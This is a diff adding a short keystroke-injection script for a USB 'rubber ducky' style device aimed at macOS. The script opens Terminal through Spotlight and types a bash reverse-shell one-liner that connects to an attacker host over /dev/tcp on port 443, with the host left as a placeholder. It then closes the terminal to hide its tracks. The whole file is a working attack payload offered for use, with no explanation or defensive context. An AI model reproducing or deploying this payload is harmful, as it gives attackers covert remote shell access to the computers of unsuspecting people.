@@ -1,0 +1,19 @@
+DELAY 3000
+REM --------------- OPEN TERMINAL IN A NEW WINDOW ---------------
+COMMAND SPACE
+DELAY 300
+STRING Terminal
+DELAY 300
+ENTER
+DELAY 700
+COMMAND n
+DELAY 500
+REM --------------- RUN PAYLOAD ---------------
+STRING bash -i >& /dev/tcp/IP/443 0>&1 &
+ENTER
+DELAY 200
+REM --------------- CLOSE TERMINAL ---------------
+STRING exit
+ENTER
+DELAY 200
+COMMAND Q
